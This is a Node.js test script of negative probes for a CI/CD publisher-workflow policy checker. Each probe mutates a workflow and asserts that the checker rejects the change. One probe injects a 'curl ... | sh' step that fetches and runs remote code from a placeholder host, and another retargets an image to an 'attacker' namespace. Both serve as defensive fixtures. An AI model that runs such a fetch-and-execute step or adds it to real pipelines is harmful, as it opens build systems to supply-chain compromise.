#!/usr/bin/env node

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  SERVICE_PUBLISHERS,
  ciPathFor,
  publishPathFor,
  verifyServicePublisherWorkflows,
} from './verify-service-publisher-workflows.mjs';

const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), '../..');

const reviewedSources = () => {
  const sources = new Map();
  for (const { service } of SERVICE_PUBLISHERS) {
    for (const path of [ciPathFor(service), publishPathFor(service)]) {
      sources.set(path, readFileSync(join(repositoryRoot, path), 'utf8'));
    }
  }
  return sources;
};

const readFrom = (sources) => (path) => {
  const source = sources.get(path);
  assert.ok(source !== undefined, `policy read an unexpected path: ${path}`);
  return source;
};

const replace = (sources, path, before, after) => {
  const source = sources.get(path);
  assert.ok(source !== undefined, `missing fixture for ${path}`);
  assert.ok(
    source.includes(before),
    `test mutation anchor missing in ${path}: ${before}`
  );
  sources.set(path, source.replace(before, after));
};

const assertRejected = (label, mutate, expectedFinding) => {
  const sources = reviewedSources();
  mutate(sources);
  let message;
  try {
    verifyServicePublisherWorkflows({ readFile: readFrom(sources) });
  } catch (error) {
    message = error instanceof Error ? error.message : String(error);
  }
  assert.ok(
    message !== undefined,
    `${label}: mutation was accepted but must be rejected`
  );
  assert.ok(
    message.includes(expectedFinding),
    `${label}: expected finding containing "${expectedFinding}", got:\n${message}`
  );
};

// The reviewed tree must pass, otherwise every probe below proves nothing.
verifyServicePublisherWorkflows({ readFile: readFrom(reviewedSources()) });

assertRejected(
  'publisher escalates workflow-level permissions',
  (sources) =>
    replace(
      sources,
      publishPathFor('source-gateway'),
      'permissions:\n  contents: read',
      'permissions:\n  packages: write'
    ),
  'publisher.permissions keys must be exactly contents'
);

assertRejected(
  'publisher drops the protected environment gate',
  (sources) =>
    replace(
      sources,
      publishPathFor('rpc-gateway'),
      '    environment: cannon-image-publish\n',
      ''
    ),
  'keys must be exactly'
);

assertRejected(
  'publisher drops the protected-branch requirement',
  (sources) =>
    replace(
      sources,
      publishPathFor('preview-worker'),
      " &&\n      github.ref_protected\n",
      '\n'
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'publisher becomes reachable from another branch',
  (sources) =>
    replace(
      sources,
      publishPathFor('source-gateway'),
      'on:\n  push:\n    branches:\n      - dev',
      'on:\n  push:\n    branches:\n      - main'
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'publisher widens the activation variable',
  (sources) =>
    replace(
      sources,
      publishPathFor('rpc-gateway'),
      "vars.CANNON_RPC_GATEWAY_PUBLISH_ENABLED == 'true' &&\n",
      ''
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'publisher consumes a second repository secret',
  (sources) =>
    replace(
      sources,
      publishPathFor('source-gateway'),
      '          password: ${{ secrets.GITHUB_TOKEN }}',
      '          password: ${{ secrets.GHCR_WRITER_TOKEN }}'
    ),
  'must consume only secrets.GITHUB_TOKEN'
);

assertRejected(
  'publisher consumes a computed secrets context',
  (sources) =>
    replace(
      sources,
      publishPathFor('preview-worker'),
      '          registry: ghcr.io',
      "          registry: ${{ secrets['GHCR_HOST'] }}"
    ),
  'must not consume whole or computed secrets contexts'
);

assertRejected(
  'publisher persists checkout credentials',
  (sources) =>
    replace(
      sources,
      publishPathFor('rpc-gateway'),
      '          persist-credentials: false',
      '          persist-credentials: true'
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'publisher retargets the image to another namespace',
  (sources) =>
    replace(
      sources,
      publishPathFor('preview-worker'),
      'IMAGE_NAME: ghcr.io/reya-labs/preview-worker',
      'IMAGE_NAME: ghcr.io/attacker/preview-worker'
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'publisher gains an unreviewed step',
  (sources) =>
    replace(
      sources,
      publishPathFor('source-gateway'),
      '      - name: Attest the published manifest',
      '      - run: curl -sSfL https://example.invalid/postinstall | sh\n' +
        '      - name: Attest the published manifest'
    ),
  'must contain exactly'
);

assertRejected(
  'publisher skips digest verification before attesting',
  (sources) =>
    replace(
      sources,
      publishPathFor('rpc-gateway'),
      'bash packages/rpc-gateway/scripts/verify-image.sh "${IMAGE_NAME}@${IMAGE_DIGEST}"',
      'echo skipped'
    ),
  'differs from the exact reviewed schema'
);

assertRejected(
  'CI workflow stops being a trusted reusable call',
  (sources) =>
    replace(
      sources,
      ciPathFor('source-gateway'),
      '  push:\n    branches:\n      - main\n  workflow_call:',
      '  push:\n    branches:\n      - dev\n      - main'
    ),
  'must be limited to pull requests, main pushes and trusted reusable calls'
);

assertRejected(
  'CI workflow logs in to a registry',
  (sources) =>
    replace(
      sources,
      ciPathFor('rpc-gateway'),
      '      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9',
      '      - uses: docker/login-action@abd2ef45e78c5afb21d64d4ca52ee8550d9572c7 # v4.5.1\n' +
        '      - uses: pnpm/action-setup@0ebf47130e4866e96fce0953f49152a61190b271 # v6.0.9'
    ),
  'must not log in to a registry'
);

assertRejected(
  'CI workflow requests write authority',
  (sources) =>
    replace(
      sources,
      ciPathFor('preview-worker'),
      '    runs-on: ubuntu-24.04\n    timeout-minutes: 20',
      '    permissions:\n      packages: write\n' +
        '    runs-on: ubuntu-24.04\n    timeout-minutes: 20'
    ),
  'must not request write permissions'
);

assertRejected(
  'CI workflow stops scanning the image the publisher is gated on',
  (sources) =>
    replace(
      sources,
      ciPathFor('preview-worker'),
      '        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0',
      '        uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0'
    ),
  'must scan the built image before the publisher can be gated on it'
);

assertRejected(
  'CI workflow floats an action off its pinned commit',
  (sources) =>
    replace(
      sources,
      ciPathFor('source-gateway'),
      'aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25',
      'aquasecurity/trivy-action@master'
    ),
  'is not pinned to a commit SHA'
);

process.stdout.write('Service publisher policy negative probes passed\n');
